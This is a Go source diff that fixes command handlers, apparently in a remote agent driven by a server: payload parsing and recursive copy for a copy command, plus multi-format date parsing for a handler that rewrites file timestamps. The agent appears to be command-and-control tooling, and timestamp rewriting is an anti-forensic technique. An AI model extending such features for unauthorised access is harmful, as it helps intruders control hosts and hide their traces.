@@ -427,32 +427,68 @@ func CmdRm(cmdBuf []byte) ([]byte, error) {
 }
 
 func CmdCp(cmdBuf []byte) ([]byte, error) {
-	buf := bytes.NewBuffer(cmdBuf)
+	// 服务端 CP 载荷：requestId(4) | len(4)+src | len(4)+dest
+	// 原实现把 requestId 当成长度读，且回执不是 FILE_OP_RESULT —— 服务端
+	// waitFileOpResult 永远超时，右键「复制到」必然失败。
+	if len(cmdBuf) < 4 {
+		return nil, errors.New("Invalid command buffer length")
+	}
+	requestId := binary.BigEndian.Uint32(cmdBuf[:4])
+	buf := bytes.NewBuffer(cmdBuf[4:])
 	arg, err := utils.ParseAnArg(buf)
 	if err != nil {
-		return nil, err
+		return fileOpResult(requestId, false, "Copy failed: "+err.Error()), nil
 	}
 	src := string(arg)
 	arg, err = utils.ParseAnArg(buf)
 	if err != nil {
-		return nil, err
+		return fileOpResult(requestId, false, "Copy failed: "+err.Error()), nil
 	}
 	dest := string(arg)
-	bytesRead, err := os.ReadFile(src)
-	if err != nil {
-		return nil, err
+
+	if err := copyPathRecursive(src, dest); err != nil {
+		return fileOpResult(requestId, false, "Copy failed: "+err.Error()), nil
 	}
-	fp, err := os.OpenFile(dest, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
+	return fileOpResult(requestId, true, "Copy "+src+" to "+dest+" success"), nil
+}
+
+// copyPathRecursive 复制文件或目录（目标存在时覆盖，不再像原实现那样以 O_APPEND 追加）
+func copyPathRecursive(src, dest string) error {
+	info, err := os.Stat(src)
 	if err != nil {
-		return nil, err
+		return err
 	}
-	defer fp.Close()
-	_, err = fp.Write(bytesRead)
-	if err != nil {
-		return nil, err
+	if !info.IsDir() {
+		data, err := os.ReadFile(src)
+		if err != nil {
+			return err
+		}
+		if dir := filepath.Dir(dest); dir != "" && dir != "." {
+			if err := os.MkdirAll(dir, 0o755); err != nil {
+				return err
+			}
+		}
+		return os.WriteFile(dest, data, info.Mode().Perm())
 	}
 
-	return []byte("Copy " + src + " to " + dest + " success"), nil
+	return filepath.Walk(src, func(p string, fi os.FileInfo, walkErr error) error {
+		if walkErr != nil {
+			return walkErr
+		}
+		rel, err := filepath.Rel(src, p)
+		if err != nil {
+			return err
+		}
+		target := filepath.Join(dest, rel)
+		if fi.IsDir() {
+			return os.MkdirAll(target, 0o755)
+		}
+		data, err := os.ReadFile(p)
+		if err != nil {
+			return err
+		}
+		return os.WriteFile(target, data, fi.Mode().Perm())
+	})
 }
 
 func CmdMv(cmdBuf []byte) ([]byte, error) {
@@ -495,6 +531,28 @@ func CallbackTime() (time.Duration, error) {
 	return time.Duration(waitTime) * time.Millisecond, nil
 }
 
+// parseModifyTime 兼容 Web 端（YYYY/MM/DD HH:mm:ss）与脚本/ISO 8601 两套时间写法。
+// 秒可有可无；只给日期时按当天 00:00:00。
+func parseModifyTime(s string) (time.Time, error) {
+	s = strings.TrimSpace(s)
+	layouts := []string{
+		"2006-01-02T15:04:05",
+		"2006-01-02T15:04",
+		"2006-01-02 15:04:05",
+		"2006-01-02 15:04",
+		"2006/01/02 15:04:05",
+		"2006/01/02 15:04",
+		"2006-01-02",
+		"2006/01/02",
+	}
+	for _, layout := range layouts {
+		if t, err := time.ParseInLocation(layout, s, time.Local); err == nil {
+			return t, nil
+		}
+	}
+	return time.Time{}, fmt.Errorf("unsupported time format: %s", s)
+}
+
 // CmdModifyTime 修改文件时间（返回 FILE_OP_RESULT：requestId(4)|ok(1)|msg）
 func CmdModifyTime(cmdBuf []byte) ([]byte, error) {
 	// 解析 requestId
@@ -526,10 +584,12 @@ func CmdModifyTime(cmdBuf []byte) ([]byte, error) {
 	// 解析文件路径
 	filePath := string(body[8+timeLen : 8+timeLen+pathLen])
 
-	// 解析时间
-	newTime, err := time.Parse("2006-01-02T15:04", timeStr)
+	// 解析时间：Web 端提示与输入框预填用 "YYYY/MM/DD HH:mm:ss"，
+	// 旧调用方（脚本/命令行）多用 ISO 8601。只认一种格式会让"修改时间"
+	// 在前端看起来下发成功、实际回执 Invalid time format，故按多种布局依次尝试。
+	newTime, err := parseModifyTime(timeStr)
 	if err != nil {
-		return nil, errors.New("Invalid time format")
+		return fileOpResult(requestId, false, "Invalid time format: "+timeStr), nil
 	}
 
 	// 在Windows上尝试使用高级API修改创建时间
